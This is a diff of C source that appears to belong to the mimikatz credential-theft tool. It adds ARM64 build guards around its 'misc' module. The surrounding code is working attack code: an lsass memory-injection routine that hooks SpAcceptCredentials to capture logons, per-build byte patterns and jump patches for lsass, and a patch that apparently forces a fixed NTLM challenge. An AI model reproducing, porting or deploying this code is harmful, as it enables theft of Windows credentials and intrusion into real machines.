@@ -10,7 +10,9 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_regedit,	L"regedit",		L"Registry Editor         (without DisableRegistryTools)"},
 	{kuhl_m_misc_taskmgr,	L"taskmgr",		L"Task Manager            (without DisableTaskMgr)"},
 	{kuhl_m_misc_ncroutemon,L"ncroutemon",	L"Juniper Network Connect (without route monitoring)"},
+#if !defined(_M_ARM64)
 	{kuhl_m_misc_detours,	L"detours",		L"[experimental] Try to enumerate all modules with Detours-like hooks"},
+#endif
 //#ifdef _M_X64
 //	{kuhl_m_misc_addsid,	L"addsid",		NULL},
 //#endif
@@ -53,7 +55,7 @@ NTSTATUS kuhl_m_misc_ncroutemon(int argc, wchar_t * argv[])
 	kull_m_patch_genericProcessOrServiceFromBuild(ncRouteMonitorReferences, ARRAYSIZE(ncRouteMonitorReferences), L"dsNcService", NULL, TRUE);
 	return STATUS_SUCCESS;
 }
-
+#if !defined(_M_ARM64)
 BOOL CALLBACK kuhl_m_misc_detours_callback_module_name_addr(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
 {
 	if(((PBYTE) pvArg >= (PBYTE) pModuleInformation->DllBase.address) && ((PBYTE) pvArg < ((PBYTE) pModuleInformation->DllBase.address + pModuleInformation->SizeOfImage)))
@@ -95,7 +97,7 @@ PBYTE kuhl_m_misc_detours_testHookDestination(PKULL_M_MEMORY_ADDRESS base, WORD 
 						else
 						{
 							dst = *(PBYTE *) ((PBYTE) aBuffer.address + myHooks[i].offsetToRead);
-#ifdef _M_X64
+#if defined(_M_X64)
 							if(machineOfProcess == IMAGE_FILE_MACHINE_I386)
 								dst = (PBYTE) ((ULONG_PTR) dst & 0xffffffff);
 #endif
@@ -105,7 +107,7 @@ PBYTE kuhl_m_misc_detours_testHookDestination(PKULL_M_MEMORY_ADDRESS base, WORD 
 						{
 							pBuffer.address = dst;
 							kull_m_memory_copy(&dBuffer, &pBuffer, sizeof(PBYTE));
-#ifdef _M_X64
+#if defined(_M_X64)
 							if(machineOfProcess == IMAGE_FILE_MACHINE_I386)
 								dst = (PBYTE) ((ULONG_PTR) dst & 0xffffffff);
 #endif
@@ -189,7 +191,7 @@ NTSTATUS kuhl_m_misc_detours(int argc, wchar_t * argv[])
 	kull_m_process_getProcessInformation(kuhl_m_misc_detours_callback_process, NULL);
 	return STATUS_SUCCESS;
 }
-
+#endif
 BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SIZE_T szDisableString, PWSTR enableString, SIZE_T szEnableString)
 {
 	BOOL status = FALSE;
@@ -474,7 +476,7 @@ NTSTATUS NTAPI misc_msv1_0_SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PU
 DWORD misc_msv1_0_SpAcceptCredentials_end(){return 'mssp';}
 #pragma optimize("", on)
 
-#ifdef _M_X64
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE INSTR_JMP[]= {0xff, 0x25, 0x00, 0x00, 0x00, 0x00}; // need 14
 BYTE PTRN_WIN5_MSV1_0[]	= {0x49, 0x8b, 0xd0, 0x4d, 0x8b, 0xc1, 0xeb, 0x08, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x89, 0x4c, 0x24, 0x08}; // damn short jump!
 BYTE PTRN_WI6X_MSV1_0[]	= {0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48};
@@ -487,7 +489,7 @@ KULL_M_PATCH_GENERIC MSV1_0AcceptReferences[] = {
 	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-17, 15}},
 	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-16, 15}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE INSTR_JMP[]= {0xe9}; // need 5
 BYTE PTRN_WIN5_MSV1_0[] = {0x8b, 0xff, 0x55, 0x8b, 0xec, 0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, 0x08, 0xe8};
 BYTE PTRN_WI6X_MSV1_0[]	= {0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, 0x08, 0xe8, 0x24, 0x00, 0x00, 0x00};
@@ -545,9 +547,9 @@ NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[])
 									RtlCopyMemory((PBYTE) aLocal.address + pGeneric->Offsets.off1, INSTR_JMP, sizeof(INSTR_JMP));
 									if(kull_m_memory_alloc(&aLsass, trampoSize, PAGE_EXECUTE_READWRITE))
 									{
-									#ifdef _M_X64
+									#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 										*(PVOID *)((PBYTE) aLocal.address + pGeneric->Offsets.off1 + sizeof(INSTR_JMP)) = (PBYTE) sSearch.result + pGeneric->Offsets.off1;
-									#elif defined _M_IX86
+									#elif defined(_M_IX86)
 										*(LONG *)((PBYTE) aLocal.address + pGeneric->Offsets.off1 + sizeof(INSTR_JMP)) = (PBYTE) sSearch.result - ((PBYTE) aLsass.address + sizeof(INSTR_JMP) + sizeof(LONG));
 									#endif
 										extensions[3].Pointer = aLsass.address;
@@ -556,9 +558,9 @@ NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[])
 											if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(aLsass.hMemory, misc_msv1_0_SpAcceptCredentials, (DWORD) ((PBYTE) misc_msv1_0_SpAcceptCredentials_end - (PBYTE) misc_msv1_0_SpAcceptCredentials), &extForCb, &aLsass))
 											{
 												RtlCopyMemory((PBYTE) aLocal.address, INSTR_JMP, sizeof(INSTR_JMP));
-											#ifdef _M_X64
+											#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 												*(PVOID *)((PBYTE) aLocal.address + sizeof(INSTR_JMP)) = aLsass.address;
-											#elif defined _M_IX86
+											#elif defined(_M_IX86)
 												*(LONG *)((PBYTE) aLocal.address + sizeof(INSTR_JMP)) = (PBYTE) aLsass.address - ((PBYTE) sSearch.result + sizeof(INSTR_JMP) + sizeof(LONG));
 											#endif
 												aLsass.address = sSearch.result;
@@ -912,7 +914,7 @@ void kuhl_m_misc_mflt_display(PFILTER_AGGREGATE_BASIC_INFORMATION info)
 	while(offset);
 }
 
-#ifdef _M_X64
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE PTRN_WI7_SHNM[] = {0x49, 0xbb, 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x48, 0xb8, 0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f, 0x48, 0x8d, 0x4e, 0x18, 0x8b, 0xd3, 0xc7, 0x46, 0x08, 0x02, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x1e, 0x48, 0x89, 0x46, 0x30, 0xe8};
 BYTE PATC_WI7_SHNM[] = {0xc7, 0x46, 0x08, 0x02, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x1e, 0x48, 0x89, 0x46, 0x30, 0x48, 0xb8, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x48, 0x89, 0x46, 0x18, 0x90, 0x90, 0x90, 0x90, 0x90};
 BYTE PTRN_W10_1709_SHNM[] = {0x48, 0xb8, 0x0a, 0x00, 0xab, 0x3f, 0x00, 0x00, 0x00, 0x0f, 0xba, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0x47, 0x30, 0xff, 0x15};
@@ -921,7 +923,7 @@ KULL_M_PATCH_GENERIC SHNMReferences[] = {
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WI7_SHNM),			PTRN_WI7_SHNM},			{sizeof(PATC_WI7_SHNM),			PATC_WI7_SHNM},			{20}},
 	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_W10_1709_SHNM),	PTRN_W10_1709_SHNM},	{sizeof(PATC_W10_1709_SHNM),	PATC_W10_1709_SHNM},	{19}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WI7_SHNM[] = {0xc7, 0x43, 0x30, 0x06, 0x01, 0xb1, 0x1d, 0xc7, 0x43, 0x34, 0x00, 0x00, 0x00, 0x0f, 0xe8};
 BYTE PATC_WI7_SHNM[] = {0x58, 0x58, 0xc7, 0x43, 0x18, 0x11, 0x22, 0x33, 0x44, 0xc7, 0x43, 0x1c, 0x55, 0x66, 0x77, 0x88};
 BYTE PTRN_W10_1709_SHNM[] = {0x8d, 0x43, 0x18, 0x6a, 0x08, 0x50, 0xc7, 0x43, 0x08, 0x02, 0x00, 0x00, 0x00, 0xc7, 0x43, 0x30, 0x0a, 0x00, 0xab, 0x3f, 0xc7, 0x43, 0x34, 0x00, 0x00, 0x00, 0x0f, 0xff, 0x15};
